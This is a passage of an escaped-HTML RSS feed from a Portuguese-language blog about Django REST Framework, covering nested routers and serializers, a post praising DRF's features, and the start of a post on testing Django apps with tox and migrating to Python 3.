    path&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;api/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; include&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;api_router&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urls&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    path&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;api/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; include&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;channels_router&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;urls&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vamos aos pontos de atenção:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Importamos &lt;code class=&quot;language-text&quot;&gt;routers&lt;/code&gt; de &lt;code class=&quot;language-text&quot;&gt;rest_framework_nested&lt;/code&gt;, e não mais de &lt;code class=&quot;language-text&quot;&gt;rest_framework&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Agora lidamos com duas instâncias de &lt;code class=&quot;language-text&quot;&gt;Router&lt;/code&gt;, a primeiro vindo de &lt;code class=&quot;language-text&quot;&gt;api_router = routers.DefaultRouter()&lt;/code&gt;,
e a segunda vindo de &lt;code class=&quot;language-text&quot;&gt;channels_router = routers.NestedDefaultRouter(api_router, r&amp;quot;channels&amp;quot;, lookup=&amp;quot;channel&amp;quot;)&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;DefaultRouter&lt;/code&gt; continua com o mesmo comportamento do exemplo anterior;&lt;/li&gt;
&lt;li&gt;Precisamos adicionar ao &lt;code class=&quot;language-text&quot;&gt;urlpatterns&lt;/code&gt; a instância de &lt;code class=&quot;language-text&quot;&gt;DefaultRouter&lt;/code&gt; e as instâncias de &lt;code class=&quot;language-text&quot;&gt;NestedDefaultRouter&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;NestedDefaultRouter&lt;/code&gt; espera três parâmetros:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;parent_router&lt;/code&gt;: O &lt;code class=&quot;language-text&quot;&gt;Router&lt;/code&gt; &quot;pai&quot;, podendo ser um &lt;code class=&quot;language-text&quot;&gt;DefaultRouter&lt;/code&gt; ou até mesmo outro &lt;code class=&quot;language-text&quot;&gt;NestedDefaultRouter&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;parent_prefix&lt;/code&gt;: O prefixo de &lt;em&gt;URL&lt;/em&gt; no qual os recursos registrados passarão a ser articulados como sub recursos;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;lookup&lt;/code&gt;: É a partir dessa informação que a chave &lt;code class=&quot;language-text&quot;&gt;channel_pk&lt;/code&gt; é criada e passada para o &lt;em&gt;viewset&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Aqui também, se você não quiser ter a visão de &lt;em&gt;browsable api&lt;/em&gt; habilitada, troque para o &lt;code class=&quot;language-text&quot;&gt;SimpleRouter&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Pronto! O recurso &lt;code class=&quot;language-text&quot;&gt;Item&lt;/code&gt; está disponível para as operações exibidas anteriormente:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;curl http://localhost:8000/api/channels/1/items/

[{&amp;quot;id&amp;quot;:1,&amp;quot;title&amp;quot;:&amp;quot;Eu me rendo: Django REST Framework&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;Confesso que nunca fui muito simpático ao Django REST Framework...&amp;quot;,&amp;quot;link&amp;quot;:&amp;quot;https://klauslaube.com.br/2020/02/06/eu-me-rendo-django-rest-framework.html&amp;quot;,&amp;quot;pub_date&amp;quot;:&amp;quot;2020-02-06T09:40:00Z&amp;quot;,&amp;quot;channel&amp;quot;:1}]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O &lt;em&gt;payload&lt;/em&gt; retorna uma chave &lt;code class=&quot;language-text&quot;&gt;channel&lt;/code&gt; para cada item. Uma vez que estamos falando de um &lt;em&gt;nested resource&lt;/em&gt;, não faz muito sentido retornarmos essa informação. A maneira mais prática de corrigirmos isso é alterando a classe serializadora:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# channels/serializers.py&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ItemSerializer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;serializers&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ModelSerializer&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Meta&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        model &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Item
        exclude &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;channel&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Como queremos tudo, menos o &lt;code class=&quot;language-text&quot;&gt;channel&lt;/code&gt;, utilizamos a propriedade &lt;code class=&quot;language-text&quot;&gt;exclude&lt;/code&gt; ao invés de &lt;code class=&quot;language-text&quot;&gt;fields&lt;/code&gt;, e determinamos o que queremos excluir da resposta.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Há muito o que ser discutido ainda, como customização, autenticação, segurança, &lt;em&gt;HATEOAS&lt;/em&gt;, etc. Assuntos esses que pretendo abordar em &lt;em&gt;posts&lt;/em&gt; vindouros.&lt;/p&gt;
&lt;p&gt;Com o mínimo coberto no &lt;em&gt;getting started&lt;/em&gt; da documentação do &lt;em&gt;DRF&lt;/em&gt;, já é
possível termos algo &lt;em&gt;up &amp;#x26; running&lt;/em&gt;. Provar conceitos e discutir contratos
passou a ser muito menos custoso graças à biblioteca.&lt;/p&gt;
&lt;p&gt;Essa &quot;proximidade&quot; de conceitos como serializadores e &lt;em&gt;viewsets&lt;/em&gt;, com conceitos bem estabelecidos do &lt;em&gt;Django&lt;/em&gt; (como &lt;em&gt;forms&lt;/em&gt; e &lt;em&gt;class-based views&lt;/em&gt;) faz com que o atrito seja menor, e a curva de aprendizagem mais baixa. É quase natural compreender tais artefatos à primeira vista.&lt;/p&gt;
&lt;p&gt;Se o seu projeto é feito em &lt;em&gt;Django&lt;/em&gt;, e você necessita escrever &lt;em&gt;APIs&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt;, não perca tempo e caia de cabeça no &lt;em&gt;REST Framework&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.django-rest-framework.org/tutorial/quickstart/&quot;&gt;Django REST Framework - Quickstart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/RSS&quot;&gt;Wikipedia - RSS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Eu me rendo: Django REST Framework]]></title><description><![CDATA[Confesso que nunca fui muito simpático ao Django REST Framework. Antes de adotá-lo tive a oportunidade de explorar outras opções, como o Restless, e admito que sempre havia algo faltando, ou algum esforço extra necessário para obter alguma funcionalidade que já vinha embutida no DRF. Comecei a…]]></description><link>https://klauslaube.com.br/2020/02/06/eu-me-rendo-django-rest-framework.html</link><guid isPermaLink="false">https://klauslaube.com.br/2020/02/06/eu-me-rendo-django-rest-framework.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Thu, 06 Feb 2020 09:40:00 GMT</pubDate><content:encoded>&lt;p&gt;Confesso que nunca fui muito simpático ao &lt;a href=&quot;https://www.django-rest-framework.org/&quot; title=&quot;Visite a página oficial do projeto&quot;&gt;&lt;em&gt;Django REST Framework&lt;/em&gt;&lt;/a&gt;. Antes de adotá-lo tive a oportunidade de explorar outras opções, como o &lt;a href=&quot;/2017/01/06/construindo-apis-em-django-com-restless.html&quot; title=&quot;Leia mais sobre o Restless&quot;&gt;&lt;em&gt;Restless&lt;/em&gt;&lt;/a&gt;, e admito que sempre havia algo faltando, ou algum esforço extra necessário para obter alguma funcionalidade que já vinha embutida no &lt;a href=&quot;/tag/drf.html&quot; title=&quot;Leia mais sobre Django REST Framework&quot;&gt;&lt;em&gt;DRF&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Comecei a aceitar a sua natureza &quot;baterias inclusas&quot; após me distanciar do desenvolvimento &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. Sob uma ótica diferente, compreendi o papel do &lt;em&gt;DRF&lt;/em&gt;, e fiz as pazes com esse sentimento de confiar em uma biblioteca (supostamente) complexa para construir &lt;a href=&quot;/tag/api.html&quot; title=&quot;Leia mais sobre APIs&quot;&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt; (teoricamente) simples. Afinal, se &quot;ser bloated&quot; for um argumento decisivo, não escolheríamos &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; para escrever &lt;em&gt;APIs&lt;/em&gt; (principalmente em um contexto de microserviços).&lt;/p&gt;
&lt;h2&gt;Motivação&lt;/h2&gt;
&lt;p&gt;É claro que a minha atual simpatia pela ferramenta não se deve apenas ao fato de eu tê-la &quot;aceitado&quot;. Pura ignorância da minha parte não ter compreendido antes todos os aspectos positivos que o projeto possui, e todas as facilidades que ele proporciona aos seus usuários.&lt;/p&gt;
&lt;h3&gt;Patrocinado&lt;/h3&gt;
&lt;p&gt;O que faz do &lt;em&gt;REST Framework&lt;/em&gt; um projeto interessante é, para começo de conversa, que ele é financiado colaborativamente, com empresas do calibre de &lt;a href=&quot;https://getsentry.com/welcome/&quot; title=&quot;Conheça o Sentry&quot;&gt;&lt;em&gt;Sentry&lt;/em&gt;&lt;/a&gt; e &lt;a href=&quot;https://www.digitalocean.com/&quot; title=&quot;Cloud sem complicação&quot;&gt;&lt;em&gt;DigitalOcean&lt;/em&gt;&lt;/a&gt; fazendo parte da lista de patrocinadores. Essa característica faz com que a biblioteca tenha um &lt;em&gt;long-term&lt;/em&gt; mais provável, uma vez que os esforços de desenvolvimento são financiados. Além disso, &lt;em&gt;releases&lt;/em&gt; são mais substanciais e frequentes.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fund.django-rest-framework.org/topics/funding/&quot; title=&quot;Veja mais em Funding&quot;&gt;Leia mais sobre como patrocinar o projeto&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Autenticação&lt;/h3&gt;
&lt;p&gt;Lidar com autenticação &quot;from scratch&quot; é no mínimo &lt;em&gt;error prone&lt;/em&gt;. O &lt;em&gt;framework&lt;/em&gt; já possui uma série de mecanismos de autenticação &lt;em&gt;built-in&lt;/em&gt; (como &lt;code class=&quot;language-text&quot;&gt;BasicAuthentication&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;SessionAuthentication&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;TokenAuthentication&lt;/code&gt;), e uma infinidade de integrações com &lt;em&gt;third parties&lt;/em&gt; (como &lt;a href=&quot;https://github.com/jazzband/django-oauth-toolkit&quot; title=&quot;Veja a página do projeto no GitHub&quot;&gt;django-oauth-toolkit&lt;/a&gt;, &lt;a href=&quot;https://github.com/davesque/django-rest-framework-simplejwt&quot; title=&quot;Biblioteca para adoção de JWT&quot;&gt;django-rest-framework-simplejwt&lt;/a&gt; e &lt;a href=&quot;https://github.com/sunscrapers/djoser&quot; title=&quot;Excelente opção de auth para APIs em Django&quot;&gt;djoser&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 590px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/49eeb3ceeb9248a95cd70ff9b2748f77/1c72d/never-give-up.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.39583333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAOABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAIDAQT/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABVI9FmkA//8QAGhABAAIDAQAAAAAAAAAAAAAAAQADAhESIv/aAAgBAQABBQLfIPmV45WpQoOp/8QAFREBAQAAAAAAAAAAAAAAAAAAARD/2gAIAQMBAT8BJ//EABURAQEAAAAAAAAAAAAAAAAAAAEQ/9oACAECAQE/AWf/xAAaEAACAgMAAAAAAAAAAAAAAAAAARAxERIh/9oACAEBAAY/AjOzh1wuP//EABsQAAMBAAMBAAAAAAAAAAAAAAABETEhQVFh/9oACAEBAAE/IY0h6xdrFnBEGn0YiuxiTw//2gAMAwEAAgADAAAAEDff/8QAFhEBAQEAAAAAAAAAAAAAAAAAAQAR/9oACAEDAQE/EHkN/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAERIf/aAAgBAgEBPxDQ6z//xAAcEAEAAgMAAwAAAAAAAAAAAAABABEhMVFhgdH/2gAIAQEAAT8QCkYzpzFa2FrduSvAjsYy8s3fya4EoC17irsmPDU//9k=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Never give up, never surrender&quot;
        title=&quot;Não há nada de errado em render-se de vez em quando (publishedtodeath.blogspot.com)&quot;
        src=&quot;/static/49eeb3ceeb9248a95cd70ff9b2748f77/1c72d/never-give-up.jpg&quot;
        srcset=&quot;/static/49eeb3ceeb9248a95cd70ff9b2748f77/7809d/never-give-up.jpg 192w,
/static/49eeb3ceeb9248a95cd70ff9b2748f77/4ecad/never-give-up.jpg 384w,
/static/49eeb3ceeb9248a95cd70ff9b2748f77/1c72d/never-give-up.jpg 590w&quot;
        sizes=&quot;(max-width: 590px) 100vw, 590px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Não há nada de errado em render-se de vez em quando (publishedtodeath.blogspot.com)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;A possibilidade de mesclar mecanismos num mesmo recurso permite que você tenha uma &lt;em&gt;API&lt;/em&gt; &lt;em&gt;session based&lt;/em&gt; para o seu &lt;em&gt;front-end&lt;/em&gt; em &lt;em&gt;React&lt;/em&gt; (por exemplo), e o mesmo recurso ser capaz de servir acessos utilizando &lt;em&gt;tokens&lt;/em&gt;, para um possível cliente &lt;em&gt;mobile&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.django-rest-framework.org/api-guide/authentication/&quot; title=&quot;Veja mais em Authentication&quot;&gt;Leia mais sobre autenticação&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;SQL &amp;#x26; NoSQL&lt;/h3&gt;
&lt;p&gt;Os serializadores são um aspecto muito interessante da biblioteca. Além do trabalho de &lt;em&gt;marshalling&lt;/em&gt;, eles também servem como validadores. Com o &lt;code class=&quot;language-text&quot;&gt;ModelSerializer&lt;/code&gt; todos os aspectos do seu modelo são &quot;traduzidos&quot; para a &lt;em&gt;API&lt;/em&gt;, no melhor estilo &lt;em&gt;Django Admin&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Mas existe também a possibilidade de escrita de seu própria classe serializadora ao herdar de &lt;code class=&quot;language-text&quot;&gt;serializers.Serializer&lt;/code&gt;. Isso traz flexibilidade para trabalhar com artefatos não relacionados com a &lt;em&gt;ORM&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;E se &lt;em&gt;HATEOAS&lt;/em&gt; for a sua praia, o &lt;code class=&quot;language-text&quot;&gt;HyperlinkedModelSerializer&lt;/code&gt; promove &lt;em&gt;hyperlinks&lt;/em&gt; entre tais classes.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.django-rest-framework.org/api-guide/serializers/&quot; title=&quot;Veja mais em Serializers&quot;&gt;Leia mais sobre serialização&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Developer eXperience&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;APIs&lt;/em&gt; escritas com o &lt;em&gt;REST Framework&lt;/em&gt; ainda ganham a funcionalidade de &quot;web browsable API&quot;. Com isso é possível navegar pelas definições da sua &lt;em&gt;API&lt;/em&gt; (como &lt;em&gt;endpoints&lt;/em&gt;, formatos e métodos) e interagir com a mesma através de uma interface amigável, pronta para ser compartilhada com outros desenvolvedores interessados em consumir a sua solução.&lt;/p&gt;
&lt;p&gt;Uma outra opção é a geração de &lt;a href=&quot;/tag/swagger.html&quot; title=&quot;Leia mais sobre Swagger&quot;&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt; através do &lt;a href=&quot;https://django-rest-swagger.readthedocs.io/en/latest/&quot; title=&quot;Leia a documentação do projeto&quot;&gt;&lt;em&gt;Django REST Swagger&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://restframework.herokuapp.com/&quot; title=&quot;Visite a aplicação de exemplo da documentação oficial&quot;&gt;Veja a &lt;em&gt;browsable API&lt;/em&gt; em ação&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Praticidade&lt;/h3&gt;
&lt;p&gt;E meu argumento final é em torno de sua praticidade. Ter uma &lt;em&gt;API&lt;/em&gt; &lt;a href=&quot;/tag/rest.html&quot; title=&quot;Leia mais sobre REST&quot;&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt; em &lt;em&gt;Django&lt;/em&gt;, com o &lt;em&gt;DRF&lt;/em&gt;, leva minutos...&lt;/p&gt;
&lt;p&gt;Algumas customizações poderão exigir um pouco mais de conhecimento da biblioteca, bem como um pouquinho de criatividade, mas nada que te impeça de proporcionar um serviço estável, bem escrito, e em baixíssimo tempo de desenvolvimento.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.django-rest-framework.org/api-guide/generic-views/#customizing-the-generic-views&quot; title=&quot;Veja mais em Customizing the generic views&quot;&gt;Leia mais sobre como customizar &lt;em&gt;views&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Talvez seja só devaneio, mas depois de trabalhar com &lt;em&gt;Spring Boot&lt;/em&gt; para construção de &lt;em&gt;APIs&lt;/em&gt; &lt;a href=&quot;/tag/java.html&quot; title=&quot;(não) leia mais sobre Java&quot;&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt; em um contexto de microserviços, foi que entendi o propósito do &lt;em&gt;REST Framework&lt;/em&gt;. Deixar de lado essa &quot;birra&quot; com ele (supostamente) ser grande serviu para poder enxergar as qualidades da ferramenta.&lt;/p&gt;
&lt;p&gt;Os pontos negativos ainda estão lá, e provavelmente você também vai achá-los quando estiver &quot;entrincheirado&quot; escrevendo a sua solução. Ainda assim, o &lt;em&gt;DRF&lt;/em&gt; deve ser considerado como possível escolha para escrita de suas &lt;em&gt;APIs&lt;/em&gt; em &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;No próximo artigo falaremos de uma maneira prática sobre o &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até lá.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.django-rest-framework.org/&quot;&gt;Django REST Framework&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Testando apps Django com Tox]]></title><description><![CDATA[O Django 2.0 foi lançado,
e com ele o suporte a Python  deixa de existir para
as próximas versões do framework. Alegria para os usuários, preocupação para os desenvolvedores
dos apps.
Afinal, a versão  é LTS (Long Term Support), logo, alguns apps (ainda) não podem abraçar
incondicionalmente a versão…]]></description><link>https://klauslaube.com.br/2018/01/05/testando-apps-django-com-tox.html</link><guid isPermaLink="false">https://klauslaube.com.br/2018/01/05/testando-apps-django-com-tox.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Fri, 05 Jan 2018 17:05:00 GMT</pubDate><content:encoded>&lt;p&gt;O &lt;a href=&quot;https://docs.djangoproject.com/pt-br/2.0/releases/2.0/&quot; title=&quot;Django 2.0 release notes&quot;&gt;&lt;em&gt;Django 2.0&lt;/em&gt;&lt;/a&gt; foi lançado,
e com ele o suporte a &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; &lt;code class=&quot;language-text&quot;&gt;2.7&lt;/code&gt; deixa de existir para
as próximas versões do &lt;em&gt;framework&lt;/em&gt;. Alegria para os usuários, preocupação para os desenvolvedores
dos &lt;a href=&quot;http://henriquebastos.net/desmistificando-o-conceito-de-django-apps/&quot; title=&quot;Desmistificando O Conceito De Django Apps&quot;&gt;&lt;em&gt;apps&lt;/em&gt;&lt;/a&gt;.
Afinal, a versão &lt;code class=&quot;language-text&quot;&gt;1.11&lt;/code&gt; é &lt;em&gt;LTS&lt;/em&gt; (Long Term Support), logo, alguns &lt;em&gt;apps&lt;/em&gt; (ainda) não podem abraçar
incondicionalmente a versão &lt;code class=&quot;language-text&quot;&gt;3.x&lt;/code&gt; da linguagem.&lt;/p&gt;
&lt;p&gt;É nesse cenário que bibliotecas como o &lt;a href=&quot;http://six.readthedocs.io/&quot; title=&quot;Python 2 and 3 Compatibility Library&quot;&gt;&lt;em&gt;six&lt;/em&gt;&lt;/a&gt;
e &lt;a href=&quot;https://tox.readthedocs.io/en/latest/&quot; title=&quot;Standardize testing in Python&quot;&gt;&lt;em&gt;tox&lt;/em&gt;&lt;/a&gt; mostram o seu valor. Nesse artigo,
vamos falar um pouquinho mais sobre a última.&lt;/p&gt;
&lt;h2&gt;Antes de começar: Vida longa ao Python 3!&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Python 2&lt;/em&gt; estará aí por mais um tempo (até 2020). Portanto, qual a motivação para mudar para o &lt;em&gt;Python 3&lt;/em&gt; agora?&lt;/p&gt;
&lt;p&gt;Na &lt;a href=&quot;https://loadsmart.com/&quot; title=&quot;Book a truck in seconds&quot;&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt;, o nosso principal projeto é em &lt;em&gt;Python&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;2.7&lt;/code&gt;.
Mas estamos experimentando &lt;em&gt;Python&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;3.x&lt;/code&gt; há um bom tempo em projetos paralelos. O fato é que a nova versão da linguagem está mais eficiente,
possui suporte a assincronicidade, melhor controle de exceções e o fogo ardente do &quot;unicode hell&quot; foi controlado.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 640px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e8828b6f6e53d7cc049d0cbca6862b42/c08c5/python-snakes.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 62.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAANABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAMEBf/EABUBAQEAAAAAAAAAAAAAAAAAAAEC/9oADAMBAAIQAxAAAAGRkZK01hP/xAAaEAEBAAIDAAAAAAAAAAAAAAABAgMiABES/9oACAEBAAEFAve0wHKwIybORKx9TH//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAaEAACAwEBAAAAAAAAAAAAAAAAARESMUEh/9oACAEBAAY/Aq4RbZOMTPOCUH//xAAbEAEAAgMBAQAAAAAAAAAAAAABABEhMUEQUf/aAAgBAQABPyEKGUcLuWBFnCr5MAQgbm/JlOc/Z//aAAwDAQACAAMAAAAQx/8A/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAERIf/aAAgBAwEBPxCqaRH/xAAWEQADAAAAAAAAAAAAAAAAAAAQIUH/2gAIAQIBAT8QqH//xAAdEAEAAwABBQAAAAAAAAAAAAABABEhMUFxkaHR/9oACAEBAAE/ED/px4O0NoWC4DUJDgGzIAjZAW3XPyDUAWAvpue4734VdL4n/9k=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Indiana Jones encarando uma cobra&amp;quot;&quot;
        title=&quot;Migrar para Python 3 pode parecer assustador. Mas é tranquilo, Indy...&quot;
        src=&quot;/static/e8828b6f6e53d7cc049d0cbca6862b42/c08c5/python-snakes.jpg&quot;
        srcset=&quot;/static/e8828b6f6e53d7cc049d0cbca6862b42/7809d/python-snakes.jpg 192w,
/static/e8828b6f6e53d7cc049d0cbca6862b42/4ecad/python-snakes.jpg 384w,
/static/e8828b6f6e53d7cc049d0cbca6862b42/c08c5/python-snakes.jpg 640w&quot;
        sizes=&quot;(max-width: 640px) 100vw, 640px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Migrar para Python 3 pode parecer assustador. Mas é tranquilo, Indy...&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;É verdade que há quebra de compatibilidade entre as versões, mas se considerarmos que a &lt;code class=&quot;language-text&quot;&gt;2.7&lt;/code&gt; só tem mais 2 anos de &quot;vida&quot;,
a urgência de migração fica mais latente.&lt;/p&gt;
&lt;h2&gt;tox é uma sacada das boas!&lt;/h2&gt;
